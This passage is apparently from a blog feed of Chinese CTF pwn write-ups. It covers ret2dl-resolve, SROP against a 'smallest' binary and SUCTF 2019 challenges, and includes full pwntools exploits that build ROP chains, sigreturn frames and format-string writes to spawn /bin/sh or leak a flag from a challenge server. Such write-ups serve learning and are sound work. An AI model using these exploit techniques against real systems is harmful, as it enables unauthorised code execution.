= (base_stage + 28) - rel_plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 1   bss_addr</span><br><span class="line">payload = &quot;a&quot;*112 </span><br><span class="line">payload += p32(read_plt) # 读100个字节到base_stage</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(100)</span><br><span class="line">payload += p32(pop_ebp) # 把base_stage pop到ebp中</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 2   system(&apos;/bin/sh&apos;)</span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += fake_reloc # stack_addr+28</span><br><span class="line">payload2 += &apos;A&apos; * align</span><br><span class="line">payload2 += fake_sym # stack_addr+36+align</span><br><span class="line">payload2 += &quot;system\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位&lt;/p&gt;
&lt;p&gt;控制程序执行 dl_resolve 函数&lt;br&gt;    给定 Link_map 以及 index 两个参数。&lt;br&gt;    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。&lt;br&gt;控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。&lt;br&gt;伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。&lt;br&gt;伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>srop</title>
    <link href="http://yoursite.com/2019/09/02/srop/"/>
    <id>http://yoursite.com/2019/09/02/srop/</id>
    <published>2019-09-02T15:51:52.000Z</published>
    <updated>2019-09-02T16:11:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h2><p>Srop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15）</p><p>偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0）<br><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%871.png" alt></p><a id="more"></a><p>这里懂了，大概的原理就懂了一点了（其实我很懵）<br>然后看到了我们的smallest</p><p><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%872.png" alt></p><p>整个程序只有start函数，没办法调用write和puts这些来leak stack_addr，这就要用到我们的srop了。</p><p>首先看懂我们的程序到底在干啥，貌似是在执行read函数，但是我们在gdb里跑一遍是可以发现我们下一步是没有操作了的。然后我们知道read和write函数只是第一个参数不一样，那我们就改一下rax的值，看到有xor 操作就知道它置零了rax，我们要做的就是绕过那一步</p><p>那我们先让程序到start最开始的地方，即0x4000b0的地方，然后直接更改低位地址为b3，绕过置零的步骤，就成功调用write了，在leak之后我们还要返回这个程序，所以要再填入一个0x4000b0<br>所以第一步我们发送三个起始地址实现leak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(start_addr) * 3</span><br></pre></td></tr></table></figure><p>在实现leak之后就要想办法把execve（‘/bin/sh’,0,0）写入栈里，最后再实现调用</p><p>然后我们知道<code>rax</code>这个寄存器非常特殊，它除了被用来指定系统调用的调用号之外，也是函数返回值最后存放的地方。因此，我们可以利用控制函数返回值来控制<code>rax</code>寄存器的值。（其实我不知道的，所以看大佬wp的时候还一脸懵，不知道为啥非要填15个字符，想着又不是格式化字符串，看来还是我太菜了）<br>然后我们将<code>rax</code>寄存器设置成15（sigreturn的系统调用号），然后调用一个<code>syscall</code>，这个效果就和调用一个<code>sigreturn</code>是一样一样的（所以在额外我们再次写入了syscall）</p><p>所以第二步是利用sigreturn构造read的frame，第三步是往栈里写入execve（‘/bin/sh’,0,0）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = 0</span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = 0x400</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)</span><br><span class="line">#把frame写入栈中</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## set rax=15 and call sigreturn</span><br><span class="line">sigreturn = p64(syscall_ret) + &apos;b&apos; * 7</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line">## call execv(&quot;/bin/sh&quot;,0,0)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x150  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)  </span><br><span class="line">print len(frame_payload)</span><br><span class="line">payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br></pre></td></tr></table></figure><p>完整的exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">small = ELF(&apos;./smallest&apos;)</span><br><span class="line">if args[&apos;REMOTE&apos;]:</span><br><span class="line">    sh = remote(&apos;127.0.0.1&apos;, 7777)</span><br><span class="line">else:</span><br><span class="line">    sh = process(&apos;./smallest&apos;)</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">syscall_ret = 0x00000000004000BE</span><br><span class="line">start_addr = 0x00000000004000B0</span><br><span class="line">## set start addr three times</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">payload = p64(start_addr) * 3</span><br><span class="line">sh.send(payload)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">## modify the return addr to start_addr+3</span><br><span class="line">## so that skip the xor rax,rax; then the rax=1</span><br><span class="line">## get stack addr</span><br><span class="line">sh.send(&apos;\xb3&apos;)</span><br><span class="line">stack_addr = u64(sh.recv()[8:16])</span><br><span class="line">log.success(&apos;leak stack addr :&apos; + hex(stack_addr))</span><br><span class="line"></span><br><span class="line">## make the rsp point to stack_addr</span><br><span class="line">## the frame is read(0,stack_addr,0x400)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = 0</span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = 0x400</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## set rax=15 and call sigreturn</span><br><span class="line">sigreturn = p64(syscall_ret) + &apos;b&apos; * 7</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line">## call execv(&quot;/bin/sh&quot;,0,0)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x150  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)</span><br><span class="line">print len(frame_payload)</span><br><span class="line">payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%873.png" alt><br>放一张23R3F大佬的理解过程图，写得很明了了<br>（不过关于p64(0)的地方为什么会变成syscall那长度为0xf的东西，我真的没理解到，感觉那个东西只是作为返回值，然后长度传给了rax，然后我一直以为p64（0）只是为了让frame如从上上图的结构，看来还得继续学习理解啊）</p><p>感觉srop就粗略的通过这题过了一下子，很多关于机制和寄存器的原理还是有点懵，底层知识还不扎实，要好好补补了</p><p>相关参考链接:<br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a>  srop的原理<br><a href="https://www.jianshu.com/p/b838a10b63c7" target="_blank" rel="noopener">https://www.jianshu.com/p/b838a10b63c7</a>  23R3F师傅的wp</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Srop&quot;&gt;&lt;a href=&quot;#Srop&quot; class=&quot;headerlink&quot; title=&quot;Srop&quot;&gt;&lt;/a&gt;Srop&lt;/h2&gt;&lt;p&gt;Srop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15）&lt;/p&gt;
&lt;p&gt;偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0）&lt;br&gt;&lt;img src=&quot;/2019/09/02/srop/%E5%9B%BE%E7%89%871.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>suctf的两三题wp</title>
    <link href="http://yoursite.com/2019/08/20/playfmt/"/>
    <id>http://yoursite.com/2019/08/20/playfmt/</id>
    <published>2019-08-20T14:58:39.000Z</published>
    <updated>2019-08-20T15:37:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了</p><p>以下附上超级简单题的一些思路，当做给自己的记录吧</p><a id="more"></a><h2 id="MT-crpyto"><a href="#MT-crpyto" class="headerlink" title="MT - crpyto"></a>MT - crpyto</h2><p>这是个密码题，但是我re基础有点太弱了，纯靠逆估计得逆很久，那就选择爆破吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned int convert(unsigned int m) &#123;</span><br><span class="line">    m = m ^ m &gt;&gt; 13;</span><br><span class="line">    m = m ^ m &lt;&lt; 9 &amp; 2029229568ll;</span><br><span class="line">    m = m ^ m &lt;&lt; 17 &amp; 2245263360ll;</span><br><span class="line">    m = m ^ m &gt;&gt; 19;</span><br><span class="line">    return m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    for (i = 0; i &lt;= (unsigned int)0xffffffffll; i++) &#123;</span><br><span class="line">        if (i &amp; 0xfffff == 0)</span><br><span class="line">            printf(&quot;%u\n&quot;, i);</span><br><span class="line">        if (convert(i) == (unsigned int)1679057065ll) &#123;</span><br><span class="line">            printf(&quot;%u&quot;, i);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//1679057065       2226413449</span><br><span class="line">//3818208026       2938293886</span><br><span class="line">//2854351778       1730632668</span><br></pre></td></tr></table></figure><p>我们发现这道题就是把给的最终结果的flag切片，四个四个以字符的形式（两个十六进制数为一个）一循环，往函数里进行异或和位移操作</p><p>写python脚本的时候，崩溃了，跑不出来（能读的位太小？还是我python不熟啊？）换个c发现巨方便 </p><p>falg : 84B45F89AF22CE7E67275BDC<br>大写发现过不去，改成小写就可以了<br>flag{84b45f89af22ce7e67275bdc} </p><h2 id="signup-re"><a href="#signup-re" class="headerlink" title="signup - re"></a>signup - re</h2><p>天知道第一道逆向竟然是rsa（看见熟悉的65537就知道了）<br>把n丢到网站上分出两个质数<br>然后直接丢给解rsa的脚本跑一下就出flag了（脚本来自超级可爱的队友，这里就不po出来了）</p><p>flag是suctf{Pwn_@_hundred_years}</p><h2 id="Playfmt-pwn"><a href="#Playfmt-pwn" class="headerlink" title="Playfmt - pwn"></a>Playfmt - pwn</h2><p>这道题，格式化字符串<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%871.png" alt><br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%872.png" alt></p><p>看到这里觉得有些眼熟，这不是lab9的那个差不多吗，关键函数，漏洞位置都一样，然后我天真的以为可以套着lab9的方法做这道题，结果…我确实天真，写完脚本，疯狂get不到shell，发现地址没爆错啊，啥都没问题，那肯定是got表改不了的问题了，这个具体看程序函数，貌似是那个this指针？（this+1是指向flag的）</p><p>看程序就知道，flag是被读进了堆里，堆的地址，我不会分析，就直接爆破吧</p><p><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%873.png" alt></p><p>偏移为6的位置作为第一个ebp，指向下一个地址，而下一个又指向了再下一个地址。偏移分别为6 、14 、26，蓝色字体的地址为heap的地址，选择爆破的话，泄露那个应该都OK<br>我们知道flag是被写进堆里的，我们就把heap的地址存入ebp指向的地址处，同时会被存进26个偏移的位置（方便读取数据）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./playfmt&apos;)</span><br><span class="line"># p = remote(&apos;120.78.192.35&apos;,9999)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[&apos;printf&apos;]</span><br><span class="line">system_libc = libc.symbols[&apos;system&apos;]  </span><br><span class="line">printf_libc = libc.symbols[&apos;printf&apos;]  </span><br><span class="line"></span><br><span class="line">def read_addr(target_addr):</span><br><span class="line">    index1 = 6   #偏移是6的地方作为第一个ebp</span><br><span class="line">    index2 = 14   #偏移是14的地方作为ebp2     --&gt;   ebp里存的是ebp2的地址</span><br><span class="line">    value_ls = map(ord, p32(target_addr))</span><br><span class="line">    low_byte = stack_addr &amp; 0xff</span><br><span class="line">for i in range(4):   </span><br><span class="line">#stack地址就为ebp2处的地址，不变，heap的地址存在ebp2里，ebp2会指向ebp3，所以地址同时写入ebp3中</span><br><span class="line">#我对这个的理解是：第一处的payload代表每个ebp里的字节存入单字节heap的地址</span><br><span class="line">        payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(low_byte + i, index1)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvline()</span><br><span class="line">        payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(value_ls[i], index2)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvline()</span><br><span class="line"></span><br><span class="line">    success(&apos;target &apos; + hex(target_addr))</span><br><span class="line">    payload = &apos;%26$p\n\x00&apos;   #ebp2指向的地址处，只存放target_addr，可直接读取</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    payload = &apos;%26$s\n\x00&apos;</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &apos;.%14$p.%18$p.\x00&apos;    #%19$p也可</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;.&quot;)</span><br><span class="line">stack_addr = int(p.recv(10),16)</span><br><span class="line">success(&apos;stack &apos; + hex(stack_addr))</span><br><span class="line">p.recvuntil(&quot;.&quot;)</span><br><span class="line">heap_addr = int(p.recv(9),16)</span><br><span class="line"></span><br><span class="line">success(&apos;stack &apos; + hex(stack_addr))</span><br><span class="line">success(&apos;heap &apos; + hex(heap_addr))</span><br><span class="line">for i in range(-0x1000, 0, 0x4):      </span><br><span class="line">#这里就随意循环heap的地址，找到flag字符，然后打印出来即可</span><br><span class="line">        success(&apos;offset &apos; + hex(i))</span><br><span class="line">        read_addr(heap_addr + i)</span><br><span class="line">        ret = p.recvline()</span><br><span class="line">        if &apos;suctf&apos; in ret:</span><br><span class="line">            print(ret)</span><br><span class="line">            p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后找大佬问了一下怎么确定flag到底写在了哪里，发现是我自己c和数据结构没学好……果然逆向基础和代码基础还是很重要的（一句话，我太菜了）</p><p>V5是new出来的一个堆，这里的传参为this指针，v8是flag读入的堆，这里是a2（*this+1）</p><p><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%874.png" alt><br>Ida里找各个值的地址啥的<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%875.png" alt><br>New出来的v3为this，地址为[heap]0x08810E30<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%876.png" alt><br>其实看这个就能知道flag写在了末尾一个半字节为a10的地方，没关系，我们接着调。</p><p>我们输入%1$p发现它跳到了一个地方<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%877.png" alt></p><p>发现其实它还没输出东西，那我们就继续往下执行，到printf执行之后，打印出第一个偏移处的地址<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%878.png" alt></p><p>然后ida里，可以看见就在printf下面，那我们就算this的位置偏移是多少（数出来是19）<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%879.png" alt><br>我们修改一下ebp的地址，使他指向堆的地址（上面有说到第26个偏移的地方指向堆的地址，我们就把它改到ebp），然后我们把ebp2里指向的堆地址改成this+1的地址</p><p>我们tel一下查看堆里的信息，发现其实this+1里存的是flag的地址（上面的flag是自己本机的）<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%8710.png" alt><br>然后我们就可以通过%19$s输出真实地址<br>再把它写入ebp2，然后再执行%19$s就可以了<br>Po个exp（来自一位特别特别好的大佬）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = remote(&apos;120.78.192.35&apos;,9999)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = &apos;%6$p&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">################## ebp&amp;ret</span><br><span class="line">log_ebp = int(p.recv(),16)#logo ebp 14$ 0xffffd048</span><br><span class="line">do_fmt_ebp = log_ebp - 0x20#do fmt ebp 6$ 0xffffd028</span><br><span class="line">do_fmt_return = log_ebp -0x1c#do_fmt return_to 7$</span><br><span class="line"></span><br><span class="line">log.info(&quot;log_ebp--&gt;p[%s]&quot;%hex(log_ebp))</span><br><span class="line">log.info(&quot;do_fmt_ebp1--&gt;p[%s]&quot;%hex(do_fmt_ebp))</span><br><span class="line">log.info(&quot;do_fmt_return--&gt;p[%s]&quot;%hex(do_fmt_return))</span><br><span class="line">#################3 this_addr,flag_addr_off</span><br><span class="line"></span><br><span class="line">payload = &apos;%19$p&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">heap_addr=int(p.recv(),16)#0x8050e30</span><br><span class="line">flag_addr_off=heap_addr+4 #0x8050e34</span><br><span class="line">log.info(&apos;heap_addr--&gt;p[%s]&apos;%hex(heap_addr))</span><br><span class="line">log.info(&apos;flag_addr_off--&gt;p[%s]&apos;%hex(flag_addr_off))</span><br><span class="line"></span><br><span class="line">################# change this to *flag on stack</span><br><span class="line">heap_addr_part=heap_addr &amp; 0xFF#0e30</span><br><span class="line">log_ebp_part=log_ebp &amp; 0xFF#d048</span><br><span class="line">heap_addr_stack_part=(log_ebp+0x14)&amp;0xFF#D05c</span><br><span class="line"></span><br><span class="line">log.info(&apos;heap_addr_part--&gt;p[%s]&apos;%hex(heap_addr_part))</span><br><span class="line">log.info(&apos;log_ebp_part--&gt;p[%s]&apos;%hex(log_ebp_part))</span><br><span class="line">log.info(&apos;heap_addr_stack_part--&gt;p[%s]&apos;%hex(heap_addr_stack_part))</span><br><span class="line"></span><br><span class="line">payload=&apos;%&apos;+str(heap_addr_stack_part)+&apos;d%6$hhn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload=&apos;%&apos;+str(heap_addr_part+4)+&apos;d%14$hhn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">################# leak flag_addr</span><br><span class="line">payload=&apos;%19$s\x00&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">flag_addr=u32(p.recv(4))</span><br><span class="line">#################</span><br><span class="line">payload=&apos;%&apos;+str(flag_addr&amp;0xFFFF)+&apos;d%14$hn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;134515884&apos;)  #%1$p的地址 0x8048CAC</span><br><span class="line">p.sendline(&apos;%19$s\x00&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()`</span><br></pre></td></tr></table></figure><p>我们前面不是可以知道那个flag到底是读在了a10的地方吗？那我们就直接改一个，把一个指向栈地址的改成指向堆地址的地址，就是偏移为6的那个地方啦，然后直接修改堆的低地址（18偏移的地方地址为a28,离flag的地方特别近，直接改低一个字节的地址就可以了，贼方便了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"># p = remote(&apos;120.78.192.35&apos;,9999)</span><br><span class="line">p = process(&apos;./playfmt&apos;)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;=\n&quot;)</span><br><span class="line">p.sendlineafter(&quot;=\n&quot;,&quot;%6$p&quot;)</span><br><span class="line">s = p.recvuntil(&quot;\n&quot;)</span><br><span 